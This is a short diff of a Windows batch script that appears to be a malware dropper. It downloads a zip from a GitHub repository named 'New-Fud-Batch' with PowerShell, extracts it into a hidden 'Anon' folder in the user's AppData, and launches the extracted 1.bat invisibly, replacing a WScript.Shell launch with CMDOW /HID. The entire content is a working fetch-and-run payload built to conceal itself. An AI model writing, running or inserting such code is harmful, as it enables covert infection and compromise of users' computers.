@@ -19,14 +19,12 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0
 
+Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm93/New-Fud-Batch/raw/main/.zip' -OutFile .zip"
 cd "C:\Users\%USERNAME%\AppData\Local"
 mkdir "Anon"
 attrib +h "Anon" /s /d
 cd C:\Users\%USERNAME%\AppData\Local\Anon" 
-Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm93/New-Fud-Batch/raw/main/.zip' -OutFile .zip"
 tar -xf .zip
 del .zip
 
-Set WshShell = CreateObject("WScript.Shell") 
-WshShell.Run chr(34) & "C:\Users\%USERNAME%\AppData\Local\Anon\1.bat" & Chr(34), 0
-Set WshShell = Nothing
+CMDOW.EXE /RUN /HID C:\Users\%USERNAME%\AppData\Local\Anon\1.bat
